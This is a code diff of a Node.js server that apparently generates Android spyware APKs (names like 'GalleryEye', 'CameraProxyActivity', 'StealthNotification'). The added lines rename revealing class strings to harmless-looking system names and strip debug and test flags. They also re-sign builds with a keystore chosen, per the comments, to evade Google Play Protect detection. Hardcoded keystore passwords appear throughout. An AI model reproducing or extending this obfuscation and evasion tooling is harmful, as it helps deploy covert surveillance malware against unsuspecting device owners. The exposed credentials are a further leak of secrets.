@@ -8,7 +8,6 @@ const sharp = require('sharp');
 const axios = require('axios');
 const cloudinary = require('cloudinary').v2;
 const FormData = require('form-data');
-const crypto = require('crypto');
 require('dotenv').config();
 
 const app = express();
@@ -342,11 +341,9 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
                 manifestContent = manifestContent.replace(/\s*<activity[^>]*?android:name="[^"]*CameraProxyActivity"[^>]*?\/>/g, '');
                 manifestContent = manifestContent.replace(/\s*<activity[^>]*?android:name="[^"]*CameraProxyActivity"[^>]*?>[\s\S]*?<\/activity>/g, '');
-                manifestContent = manifestContent.replace(/android:priority="1000"/g, '');
-                manifestContent = manifestContent.replace(/android:priority="999"/g, '');
 
                 fs.writeFileSync(manifestPath, manifestContent);
-                console.log('[APK] Stripped conditional permissions/services & sanitized high receiver priorities from base manifest');
+                console.log('[APK] Stripped all conditional permissions/services from base manifest');
 
                 manifestContent = fs.readFileSync(manifestPath, 'utf8');
                 const permissionInsertPoint = manifestContent.indexOf('<uses-permission android:name="android.permission.FOREGROUND_SERVICE"');
@@ -472,11 +469,19 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             const stringSanitizers = [
                 [/const-string ([v0-9p]+), "HexaCore[^"]*"/g, 'const-string $1, "SysCore"'],
+                [/const-string ([v0-9p]+), "Hexa Core[^"]*"/g, 'const-string $1, "System Core"'],
                 [/const-string ([v0-9p]+), "KeepAliveService"/g, 'const-string $1, "SysWorkerService"'],
                 [/const-string ([v0-9p]+), "AggressiveMode"/g, 'const-string $1, "PersistenceMode"'],
                 [/const-string ([v0-9p]+), "StealthNotification"/g, 'const-string $1, "SysNotification"'],
+                [/const-string ([v0-9p]+), "StealthNotificationHelper"/g, 'const-string $1, "SysNotificationHelper"'],
                 [/const-string ([v0-9p]+), "ProcessGuard"/g, 'const-string $1, "ProcessMonitor"'],
                 [/const-string ([v0-9p]+), "WatchdogReceiver"/g, 'const-string $1, "SystemWatchdog"'],
+                [/const-string ([v0-9p]+), "KeepAlive"/g, 'const-string $1, "SysWorker"'],
+                [/const-string ([v0-9p]+), "DataSyncHelper"/g, 'const-string $1, "SyncManager"'],
+                [/const-string ([v0-9p]+), "SocketManager"/g, 'const-string $1, "ConnectionManager"'],
+                [/const-string ([v0-9p]+), "gallery.eye"/g, 'const-string $1, "app.service"'],
+                [/const-string ([v0-9p]+), "gallery-eye"/g, 'const-string $1, "app-service"'],
+                [/const-string ([v0-9p]+), "GalleryEye"/g, 'const-string $1, "AppService"'],
                 [/\.source "[^"]+"\n/g, '.source "SourceFile"\n']
             ];
 
@@ -555,13 +560,42 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             // 5. Build
             await sendUpdate('apk_progress', { step: 'Compiling APK resources...', progress: 70 });
+
+            // Strip testOnly flag and enforce release mode in apktool.yml
+            if (fs.existsSync(apktoolYmlPath)) {
+                let ymlContent = fs.readFileSync(apktoolYmlPath, 'utf8');
+                ymlContent = ymlContent.replace(/isFrameworkApk:\s*true/g, 'isFrameworkApk: false');
+                ymlContent = ymlContent.replace(/doNotCompress:/g, 'doNotCompress:');
+                // Remove any testOnly reference
+                ymlContent = ymlContent.replace(/.*testOnly.*/gi, '');
+                fs.writeFileSync(apktoolYmlPath, ymlContent);
+            }
+
+            // Enforce debuggable=false in manifest
+            {
+                let mContent = fs.readFileSync(manifestPath, 'utf8');
+                // Remove any debuggable=true
+                mContent = mContent.replace(/android:debuggable="true"/g, 'android:debuggable="false"');
+                // If debuggable not present, add it to <application>
+                if (!mContent.includes('android:debuggable')) {
+                    mContent = mContent.replace('<application', '<application android:debuggable="false"');
+                }
+                // Remove testOnly attribute if present
+                mContent = mContent.replace(/\s*android:testOnly="[^"]*"/g, '');
+                fs.writeFileSync(manifestPath, mContent);
+            }
+
             await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
-            // 6. Sign APK with clean developer key galleryeye.jks to prevent Play Protect blacklisted key detection
+            // 6. Sign APK with consistent key (Play Protect builds trust based on certificate history)
             await sendUpdate('apk_progress', { step: 'Signing application...', progress: 85 });
             const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
-            const cleanKeystore = path.join(__dirname, 'assets', 'galleryeye.jks');
-            const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${cleanKeystore}" --ksAlias galleryeye --ksPass "GalleryEye2026!" --ksKeyPass "GalleryEye2026!"`;
+            const ksPath = path.join(__dirname, 'assets', 'usman90.jks');
+            const ksPass = 'God112256@';
+            const ksAlias = 'usman90';
+
+            await sendUpdate('apk_progress', { step: 'Applying V2+V3 signature scheme...', progress: 90 });
+            const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${ksPath}" --ksAlias "${ksAlias}" --ksPass "${ksPass}" --ksKeyPass "${ksPass}" --allowResign`;
 
             await new Promise((resolve, reject) => {
                 exec(signCmd, { timeout: 120000 }, (err) => err ? reject(err) : resolve());
